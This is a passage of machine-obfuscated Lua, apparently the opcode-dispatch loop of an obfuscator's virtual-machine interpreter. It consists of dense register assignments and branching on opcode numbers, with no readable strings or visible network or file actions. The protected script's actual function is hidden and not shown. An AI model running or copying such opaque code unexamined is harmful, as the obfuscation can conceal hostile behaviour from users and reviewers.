d;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))else local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];d=y[548]w[d]=w[d](w[d+1])end;elseif z<=244 then local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end elseif z~=246 then w[y[548]][y[613]]=y[554];else local d;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))end;elseif z<=249 then if z<=247 then if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;elseif 249>z then local d=y[548];do return w[d],w[d+1]end else local d=y[548]w[d]=w[d](r(w,d+1,y[613]))end;elseif 250>=z then local d=y[548]w[d](w[d+1])elseif 251<z then local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))else local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end end;elseif z<=258 then if z<=255 then if 253>=z then local d,m=0 while true do if d<=7 then if d<=3 then if d<=1 then if 1>d then m=nil else w[y[548]]=w[y[613]][y[554]];end else if d~=3 then n=n+1;else y=f[n];end end else if d<=5 then if d==4 then w[y[548]]=y[613];else n=n+1;end else if 6<d then w[y[548]]=y[613];else y=f[n];end end end else if d<=11 then if d<=9 then if 8==d then n=n+1;else y=f[n];end else if 11>d then w[y[548]]=y[613];else n=n+1;end end else if d<=13 then if d<13 then y=f[n];else m=y[548]end else if 15>d then w[m]=w[m](r(w,m+1,y[613]))else break end end end end d=d+1 end elseif z<255 then local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];d=y[548]w[d]=w[d]()else local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end end;elseif z<=256 then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if w[y[548]]then n=n+1;else n=y[613];end;elseif z<258 then local d=y[548]w[d]=w[d](w[d+1])else local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end end;elseif z<=261 then if 259>=z then local d=0 while true do if d<=9 then if d<=4 then if d<=1 then if d~=1 then w[y[548]][y[613]]=y[554];else n=n+1;end else if d<=2 then y=f[n];else if 3<d then n=n+1;else w[y[548]]={};end end end else if d<=6 then if 5==d then y=f[n];else w[y[548]][y[613]]=w[y[554]];end else if d<=7 then n=n+1;else if 9>d then y=f[n];else w[y[548]]=h[y[613]];end end end end else if d<=14 then if d<=11 then if 11>d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][y[554]];else if 14~=d then n=n+1;else y=f[n];end end end else if d<=16 then if 16~=d then w[y[548]][y[613]]=w[y[554]];else n=n+1;end else if d<=17 then y=f[n];else if d==18 then w[y[548]][y[613]]=w[y[554]];else break end end end end end d=d+1 end elseif z<261 then local d;local m,v;local ba;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];ba=y[548]m,v=i(w[ba](r(w,ba+1,y[613])))p=v+ba-1 d=0;for v=ba,p do d=d+1;w[v]=m[d];end;else local d=y[548];local m=w[d];for v=d+1,p do t(m,w[v])end;end;elseif 262>=z then w[y[548]]=true;elseif 263<z then local d;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];d=y[548]w[d]=w[d](w[d+1])else local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end end;elseif 276>=z then if z<=270 then if z<=267 then if 265>=z then local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end elseif z>266 then local d;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))else local d=y[548];local m=y[554];local v=d+2;local ba={w[d](w[d+1],w[v])};for bb=1,m do w[v+bb]=ba[bb];end local d=w[d+3];if d then w[v]=d;n=y[613];else n=n+1 end;end;elseif z<=268 then local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];d=y[548]w[d]=w[d](w[d+1])elseif 269==z then local d;local m;local v;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];v=y[548]m={w[v](w[v+1])};d=0;for ba=v,y[554]do d=d+1;w[ba]=m[d];end else w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];if(w[y[548]]~=y[554])then n=n+1;else n=y[613];end;end;elseif 273>=z then if z<=271 then w[y[548]]=#w[y[613]];elseif z~=273 then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];else j[y[613]]=w[y[548]];end;elseif z<=274 then local d;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))elseif z<276 then local d=w[y[554]];if not d then n=n+1;else w[y[548]]=d;n=y[613];end;else local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=false;n=n+1;y=f[n];d=y[548]w[d](w[d+1])end;elseif z<=282 then if 279>=z then if 277>=z then for d=y[548],y[613],1 do w[d]=nil;end;elseif 278==z then a(c,e);n=n+1;y=f[n];w={};for d=0,u,1 do if d<o then w[d]=s[d+1];else break;end;end;n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];else w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;end;elseif z<=280 then local d,m,v,ba=0 while true do if d<=9 then if d<=4 then if d<=1 then if d>0 then v=nil else m=nil end else if d<=2 then ba=nil else if 4>d then w[y[548]]=h[y[613]];else n=n+1;end end end else if d<=6 then if d==5 then y=f[n];else w[y[548]]=h[y[613]];end else if d<=7 then n=n+1;else if 9~=d then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=14 then if d<=11 then if 10<d then y=f[n];else n=n+1;end else if d<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if d<14 then n=n+1;else y=f[n];end end end else if d<=16 then if d>15 then v={w[ba](w[ba+1])};else ba=y[548]end else if d<=17 then m=0;else if d==18 then for bb=ba,y[554]do m=m+1;w[bb]=v[m];end else break end end end end end d=d+1 end elseif 282~=z then local d;local m;local v;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];v=y[613];m=y[554];d=k(w,g,v,m);w[y[548]]=d;else w[y[548]]=false;end;elseif z<=285 then if 283>=z then local d=y[548];p=d+x-1;for m=d,p do local d=q[m-d];w[m]=d;end;elseif z>284 then w[y[548]]=(not w[y[613]]);else local d;w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))end;elseif 286>=z then w[y[548]]=w[y[613]][y[554]];elseif z<288 then local d=y[548]local m,q=i(w[d](w[d+1]))p=q+d-1 local q=0;for v=d,p do q=q+1;w[v]=m[q];end;else local d;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))end;elseif z<=336 then if 312>=z then if 300>=z then if z<=294 then if 291>=z then if 289>=z then if(y[548]<w[y[554]])then n=n+1;else n=y[613];end;elseif 291>z then local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))else w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];if not w[y[548]]then n=n+1;else n=y[613];end;end;elseif z<=292 then w[y[548]]=y[613]*w[y[554]];elseif z~=294 then local d=y[548]w[d]=w[d](r(w,d+1,y[613]))else local d;w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=j[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];d=y[548]w[d](r(w,d+1,y[613]))end;elseif z<=297 then if(295>=z)then local d,m=0 while true do if d<=12 then if d<=5 then if d<=2 then if d<=0 then m=nil else if d<2 then w={};else for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;end end else if d<=3 then n=n+1;else if d==4 then y=f[n];else w[y[548]]=h[y[613]];end end end else if d<=8 then if d<=6 then n=n+1;else if 7<d then w[y[548]]=j[y[613]];else y=f[n];end end else if d<=10 then if 10>d then n=n+1;else y=f[n];end else if d~=12 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end end else if d<=18 then if d<=15 then if d<=13 then y=f[n];else if 14==d then w[y[548]]=y[613];else n=n+1;end end else if d<=16 then y=f[n];else if 17==d then w[y[548]]=y[613];else n=n+1;end end end else if d<=21 then if d<=19 then y=f[n];else if 21>d then w[y[548]]=y[613];else n=n+1;end end else if d<=23 then if 22<d then m=y[548]else y=f[n];end else if 25>d then w[m]=w[m](r(w,m+1,y[613]))else break end end end end end d=d+1 end elseif not(296~=z)then local d,m,q,v=0 while true do if d<=9 then if d<=4 then if d<=1 then if d>0 then q=nil else m=nil end else if d<=2 then v=nil else if d==3 then w[y[548]]=h[y[613]];else n=n+1;end end end else if d<=6 then if 5<d then w[y[548]]=h[y[613]];else y=f[n];end else if d<=7 then n=n+1;else if d<9 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=14 then if d<=11 then if 10<d then y=f[n];else n=n+1;end else if d<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if 13==d then n=n+1;else y=f[n];end end end else if d<=16 then if 15==d then v=y[548]else q={w[v](w[v+1])};end else if d<=17 then m=0;else if d==18 then for x=v,y[554]do m=m+1;w[x]=q[m];end else break end end end end end d=d+1 end else if(y[548]<w[y[554]])then n=n+1;else n=y[613];end;end;elseif z<=298 then local d;w={};for m=0,u,1 do if m<o then w[m]=s[m+1];else break;end;end;n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548];w[d]=w[d]-w[d+2];n=y[613];elseif z<300 then local d=y[548]w[d](r(w,d+1,p))else local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))end;elseif 306>=z then if 303>=z then if 301>=z then local d,m=0 while true do if d<=8 then if d<=3 then if d<=1 then if d~=1 then m=nil else w[y[548]]=j[y[613]];end else if d~=3 then n=n+1;else y=f[n];end end else if d<=5 then if d>4 then n=n+1;else w[y[548]]=w[y[613]][y[554]];end else if d<=6 then y=f[n];else if d==7 then w[y[548]]=y[613];else n=n+1;end end end end else if d<=13 then if d<=10 then if d~=10 then y=f[n];else w[y[548]]=y[613];end else if d<=11 then n=n+1;else if d~=13 then y=f[n];else w[y[548]]=y[613];end end end else if d<=15 then if d>14 then y=f[n];else n=n+1;end else if d<=16 then m=y[548]else if 18>d then w[m]=w[m](r(w,m+1,y[613]))else break end end end end end d=d+1 end elseif z<303 then w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];n=y[613];else local d=y[548]local i,m=i(w[d](r(w,d+1,y[613])))p=m+d-1 local m=0;for q=d,p do m=m+1;w[q]=i[m];end;end;elseif 304>=z then local d;w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];w[y[548]]=y[613];n=n+1;y=f[n];d=y[548]w[d]=w[d](r(w,d+1,y[613]))elseif 306>z then w[y[548]]=w[y[613]]+y[554];else local d;w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=false;n=n+1;y=f[n];d=y[548]w[d](w[d+1])end;elseif z<=309 then if z<=307 then local d;local i;w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]={};n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]][y[613]]=w[y[554]];n=n+1;y=f[n];w[y[548]]={r({},1,y[613])};n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];i=y[548];d=w[i];for m=i+1,y[613]do t(d,w[m])end;elseif z~=309 then local d;local i;local m;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];m=y[548]i={w[m](w[m+1])};d=0;for q=m,y[554]do d=d+1;w[q]=i[d];end else w[y[548]]=w[y[613]]/y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]]-w[y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]]/y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]]*y[554];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]];n=n+1;y=f[n];n=y[613];end;elseif 310>=z then local d;local i;local m;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];m=y[548]i={w[m](w[m+1])};d=0;for q=m,y[554]do d=d+1;w[q]=i[d];end elseif 311==z then local d;local i;local m;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];m=y[548]i={w[m](w[m+1])};d=0;for q=m,y[554]do d=d+1;w[q]=i[d];end else local d;local i;local m;w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][w[y[554]]];n=n+1;y=f[n];w[y[548]]=h[y[613]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];w[y[548]]=w[y[613]][y[554]];n=n+1;y=f[n];m=y[613];i=y[554];d=k(w,g,m,i);w[y[548]]=d;end;elseif z<=324 then if 318>=z then if(z<=315)then if(313>=z)then local d,i=0 while true do if(d==8 or d<8)then if(d==3 or d<3)then if(d<=1)then if d~=1 then i=nil else w[y[548]]=w[y[613]][y[554]];end else if(2==d)then n=(n+1);else y=f[n];end end else if d<=5 then if(5>d)then w[y[548]]=h[y[613]];else n=(n+1);end else if(d<=6)then y=f[n];else if(7<d)then n=n+1;else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=13 then if(d==10 or d<10)then if not(10==d)then y=f[n];else w[y[548]]=y[613];end else if(d<11 or d==11)then n=n+1;else if 13>d then y=f[n];else w[y[548]]=y[613];end end end else if(d<=15)then if d>14 then y=f[n];else n=(n+1);end else if d<=16 then i=y[548]else if 18>d then w[i]=w[i](r(w,i+1,y[613]))else break end end end end end d=d+1 end elseif 315>z then local d,i,m,q=0 while true do if d<=9 then if d<=4 then if d<=1 then if 1>d then i=nil else m=nil end else if d<=2 then q=nil else if 4~=d then w[y[548]]=h[y[613]];else n=n+1;end end end else if d<=6 then if 6~=d then y=f[n];else w[y[548]]=h[y[613]];end else if d<=7 then n=n+1;else if d==8 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=14 then if d<=11 then if 11>d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if d<14 then n=n+1;else y=f[n];end end end else if d<=16 then if d==15 then q=y[548]else m={w[q](w[q+1])};end else if d<=17 then i=0;else if d>18 then break else for v=q,y[554]do i=i+1;w[v]=m[i];end end end end end end d=d+1 end else local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if d<1 then i=nil else w[y[548]]=w[y[613]][w[y[554]]];end else if 3>d then n=n+1;else y=f[n];end end else if d<=5 then if d>4 then n=n+1;else w[y[548]]=w[y[613]];end else if d<=6 then y=f[n];else if 7==d then w[y[548]]=y[613];else n=n+1;end end end end else if d<=13 then if d<=10 then if d>9 then w[y[548]]=y[613];else y=f[n];end else if d<=11 then n=n+1;else if 12<d then w[y[548]]=y[613];else y=f[n];end end end else if d<=15 then if d==14 then n=n+1;else y=f[n];end else if d<=16 then i=y[548]else if 18>d then w[i]=w[i](r(w,i+1,y[613]))else break end end end end end d=d+1 end end;elseif(z<=316)then local d,i=0 while true do if d<=7 then if d<=3 then if d<=1 then if d~=1 then i=nil else w[y[548]]=h[y[613]];end else if d<3 then n=n+1;else y=f[n];end end else if d<=5 then if d<5 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if d==6 then y=f[n];else w[y[548]]=y[613];end end end else if d<=11 then if d<=9 then if 8<d then y=f[n];else n=n+1;end else if 10==d then w[y[548]]=y[613];else n=n+1;end end else if d<=13 then if d<13 then y=f[n];else i=y[548]end else if 15>d then w[i]=w[i](r(w,i+1,y[613]))else break end end end end d=d+1 end elseif(z<318)then local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if 1>d then i=nil else w[y[548]]=j[y[613]];end else if d~=3 then n=n+1;else y=f[n];end end else if d<=5 then if d==4 then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if d<=6 then y=f[n];else if d~=8 then w[y[548]]=y[613];else n=n+1;end end end end else if d<=13 then if d<=10 then if d==9 then y=f[n];else w[y[548]]=y[613];end else if d<=11 then n=n+1;else if d<13 then y=f[n];else w[y[548]]=y[613];end end end else if d<=15 then if d~=15 then n=n+1;else y=f[n];end else if d<=16 then i=y[548]else if d>17 then break else w[i]=w[i](r(w,i+1,y[613]))end end end end end d=d+1 end else local d,i,m,q=0 while true do if d<=9 then if d<=4 then if d<=1 then if d<1 then i=nil else m=nil end else if d<=2 then q=nil else if 3<d then n=n+1;else w[y[548]]=h[y[613]];end end end else if d<=6 then if d<6 then y=f[n];else w[y[548]]=h[y[613]];end else if d<=7 then n=n+1;else if d==8 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=14 then if d<=11 then if 10==d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if 13==d then n=n+1;else y=f[n];end end end else if d<=16 then if d==15 then q=y[548]else m={w[q](w[q+1])};end else if d<=17 then i=0;else if 19~=d then for v=q,y[554]do i=i+1;w[v]=m[i];end else break end end end end end d=d+1 end end;elseif(321==z or 321>z)then if(319>=z)then for d=y[548],y[613],1 do w[d]=nil;end;elseif(z==320)then local d,i,m,q=0 while true do if d<=9 then if d<=4 then if d<=1 then if 1>d then i=nil else m=nil end else if d<=2 then q=nil else if 3<d then n=n+1;else w[y[548]]=j[y[613]];end end end else if d<=6 then if d>5 then w[y[548]]=w[y[613]][y[554]];else y=f[n];end else if d<=7 then n=n+1;else if 8<d then w[y[548]]=w[y[613]][y[554]];else y=f[n];end end end end else if d<=14 then if d<=11 then if 11~=d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][y[554]];else if d>13 then y=f[n];else n=n+1;end end end else if d<=16 then if 16~=d then q=y[548]else m={w[q](w[q+1])};end else if d<=17 then i=0;else if d<19 then for v=q,y[554]do i=i+1;w[v]=m[i];end else break end end end end end d=d+1 end else local d=0 while true do if d<=7 then if d<=3 then if d<=1 then if 0==d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 3~=d then y=f[n];else w[y[548]][y[613]]=w[y[554]];end end else if d<=5 then if d==4 then n=n+1;else y=f[n];end else if 7~=d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end end end else if d<=11 then if d<=9 then if 9~=d then y=f[n];else w[y[548]]=h[y[613]];end else if 10<d then y=f[n];else n=n+1;end end else if d<=13 then if 13~=d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if d<=14 then y=f[n];else if d~=16 then if(w[y[548]]~=w[y[554]])then n=n+1;else n=y[613];end;else break end end end end end d=d+1 end end;elseif(z<322 or z==322)then local d,i,m,q=0 while true do if d<=9 then if d<=4 then if d<=1 then if 0==d then i=nil else m=nil end else if d<=2 then q=nil else if d>3 then n=n+1;else w[y[548]]=h[y[613]];end end end else if d<=6 then if 5==d then y=f[n];else w[y[548]]=h[y[613]];end else if d<=7 then n=n+1;else if d==8 then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end end else if d<=14 then if d<=11 then if 11~=d then n=n+1;else y=f[n];end else if d<=12 then w[y[548]]=w[y[613]][w[y[554]]];else if 13==d then n=n+1;else y=f[n];end end end else if d<=16 then if d==15 then q=y[548]else m={w[q](w[q+1])};end else if d<=17 then i=0;else if d>18 then break else for v=q,y[554]do i=i+1;w[v]=m[i];end end end end end end d=d+1 end elseif(323<z)then local d,i=0 while true do if d<=8 then if d<=3 then if d<=1 then if 1~=d then i=nil else w[y[548]]=j[y[613]];end else if d~=3 then n=n+1;else y=f[n];end end else if d<=5 then if 5>d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if d<=6 then y=f[n];else if d>7 then n=n+1;else w[y[548]]=y[613];end end end end else if d<=13 then if d<=10 then if d<10 then y=f[n];else w[y[548]]=y[613];end else if d<=11 then n=n+1;else if d<13 then y=f[n];else w[y[548]]=y[613];end end end else if d<=15 then if 14==d then n=n+1;else y=f[n];end else if d<=16 then i=y[548]else if 17==d then w[i]=w[i](r(w,i+1,y[613]))else break end end end end end d=d+1 end else local d=0 while true do if d<=6 then if d<=2 then if d<=0 then w[y[548]]=w[y[613]][y[554]];else if 2~=d then n=n+1;else y=f[n];end end else if d<=4 then if 4>d then w[y[548]]=w[y[613]][y[554]];else n=n+1;end else if 5==d then y=f[n];else w[y[548]]=w[y[613]][y[554]];end end end else if d<=9 then 